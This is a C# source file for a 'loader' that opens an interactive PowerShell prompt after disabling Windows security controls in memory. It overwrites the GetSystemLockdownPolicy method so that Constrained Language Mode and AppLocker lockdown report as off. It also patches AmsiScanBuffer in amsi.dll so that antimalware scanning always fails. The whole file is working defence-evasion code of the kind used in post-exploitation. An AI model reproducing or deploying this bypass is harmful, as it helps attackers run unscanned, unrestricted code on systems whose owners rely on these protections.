using System;
using System.IO;
#if !SLIM
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
#endif

namespace loader
{

    public class MainClass
    {
#if !SLIM
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
#endif

#if !DLL
        public static void Main(string[] args)
        {
            go();
        }
#endif

        public static void go()
        {
#if !SLIM
            var Automation = typeof(System.Management.Automation.Alignment).Assembly;
            var get_lockdown_info = Automation.GetType("System.Management.Automation.Security.SystemPolicy").GetMethod("GetSystemLockdownPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
            var get_lockdown_handle = get_lockdown_info.MethodHandle;
            uint lpflOldProtect;

            RuntimeHelpers.PrepareMethod(get_lockdown_handle);
            var get_lockdown_ptr = get_lockdown_handle.GetFunctionPointer();

            VirtualProtect(get_lockdown_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);

            // xor rax,rax; ret -> SystemEnforcementMode.None
            var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
            Marshal.Copy(new_instr, 0, get_lockdown_ptr, 4);

            var amsi = LoadLibrary("amsi.dll");
            var AmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
            VirtualProtect(AmsiScanBuffer, new UIntPtr(8), 0x40, out lpflOldProtect);

            if (System.IntPtr.Size == 8)
            {
                // mov eax,E_INVALIDARG; ret
                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, AmsiScanBuffer, 6);
            } else
            {
                // mov eax,E_INVALIDARG; ret 18 (stdcall cleanup)
                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }, 0, AmsiScanBuffer, 8);
            }
#endif

            var asmDir = Path.GetDirectoryName(typeof(System.Management.Automation.PowerShell).Assembly.Location);
            if (asmDir != null)
            {
                var modulesDir = Path.Combine(asmDir, "Modules");
                if (!Directory.Exists(modulesDir))
                    modulesDir = Path.Combine(asmDir, "runtimes", "win", "lib", "net10.0", "Modules");
                if (Directory.Exists(modulesDir))
                    Environment.SetEnvironmentVariable("PSModulePath",
                        modulesDir + ";" + Environment.GetEnvironmentVariable("PSModulePath"));
            }

            var iss = System.Management.Automation.Runspaces.InitialSessionState.CreateDefault2();
            using var runspace = System.Management.Automation.Runspaces.RunspaceFactory.CreateRunspace(iss);
            runspace.Open();
            using var shell = System.Management.Automation.PowerShell.Create();
            shell.Runspace = runspace;
            while (true)
            {
                Console.Write("PS> ");
                var line = Console.ReadLine();
                if (line == null || line.Equals("exit", StringComparison.OrdinalIgnoreCase))
                    break;
                try
                {
                    shell.AddScript(line);
                    var results = shell.Invoke();
                    foreach (var r in results)
                        Console.WriteLine(r);
                    if (shell.Streams.Error.Count > 0)
                    {
                        foreach (var e in shell.Streams.Error)
                            Console.Error.WriteLine(e);
                        shell.Streams.Error.Clear();
                    }
                    shell.Commands.Clear();
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine(ex.Message);
                    shell.Commands.Clear();
                }
            }
        }
    }

}
